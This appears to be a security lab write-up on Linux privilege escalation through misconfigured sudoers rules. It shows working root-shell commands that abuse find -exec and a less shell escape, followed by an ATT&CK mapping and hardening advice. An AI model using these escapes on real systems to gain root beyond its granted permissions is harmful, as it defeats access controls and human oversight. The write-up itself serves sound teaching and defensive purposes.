# 🔐 Linux Privilege Escalation via Sudo Misconfiguration

## 📌 Overview
In this lab, I explored **sudo configuration vulnerabilities** and demonstrated multiple real-world privilege escalation techniques caused by **misconfigured sudoers rules**.

Sudo is designed to grant controlled administrative access, but overly permissive rules—especially those allowing command execution without password prompts—can be abused to obtain **full root access**. This lab simulated common misconfigurations encountered during penetration tests and internal security assessments.

---

## 🎯 Objectives
- Understand `/etc/sudoers` file syntax and behavior
- Enumerate sudo permissions using `sudo -l`
- Exploit sudo rules with unrestricted commands
- Abuse allowed commands with shell escape functionality
- Achieve and verify root-level access

---

## 🧠 Skills Demonstrated
- Linux privilege escalation
- Sudoers file analysis
- Command execution abuse
- Shell escape techniques
- Post-exploitation validation
- Secure configuration review

---

## 🛠️ Tools & Commands Used
- `sudo`
- `find`
- `less`
- `bash`
- `tee`
- `cat`
- `/etc/sudoers`

---

## 🔍 Vulnerability Scenarios & Exploitation

### 1️⃣ Unrestricted Command Execution via Sudo (NOPASSWD)

**Misconfiguration Identified**
```bash
(root) NOPASSWD: /usr/bin/find


sudo find /home -exec /bin/bash \;

```

Because find allows arbitrary command execution via -exec, this resulted in an immediate root shell.

### 2️⃣ Privilege Escalation via Allowed Command with Shell Escape
Misconfiguration Identified
(root) NOPASSWD: /bin/less /var/log/messages

Although less appears harmless, it supports shell escapes.
Exploitation
```bash
sudo less /var/log/messages
!/bin/bash
```
This spawned a root shell directly from the pager, bypassing intended restrictions.
### ✅ Verification
Privilege escalation was confirmed by writing files to /root, a directory normally inaccessible to non-root users:
```bash
echo "success" | sudo tee /root/success.txt
```
## 🧬 MITRE ATT&CK Mapping
| Tactic                  | Technique ID  | Technique Name                          | Description                                        |
| ----------------------- | ------------- | --------------------------------------- | -------------------------------------------------- |
| Privilege Escalation    | **T1548.003** | Abuse Elevation Control Mechanism: Sudo | Exploiting sudo misconfigurations                  |
| Execution               | **T1059**     | Command and Scripting Interpreter       | Shell execution via allowed commands               |
| Privilege Escalation    | **T1068**     | Exploitation for Privilege Escalation   | Abuse of administrative misconfigurations          |
| Defense Evasion         | **T1202**     | Indirect Command Execution              | Leveraging legitimate binaries to execute commands |
| Persistence (Potential) | **T1547**     | Boot or Logon Autostart Execution       | Misused admin permissions can enable persistence   |




```
## 🚨 Security Impact
If left unmitigated, sudo misconfigurations can lead to:
Full root compromise


Unauthorized system changes


Credential theft


Persistence mechanisms


Complete loss of system integrity


These vulnerabilities are extremely common and often overlooked during system hardening.

## 🛡️ Defensive Recommendations
Apply principle of least privilege in sudo rules


Avoid NOPASSWD unless absolutely required


Restrict commands with no shell escape capability


Use full command paths and argument restrictions


Audit sudo permissions regularly:

 sudo -l


Monitor sudo command execution logs



## 🏁 Key Takeaways
Sudo is one of the most abused privilege escalation vectors


“Harmless” commands can enable root shells


Enumeration (sudo -l) is critical post-access


Secure sudo configuration is essential for Linux hardening



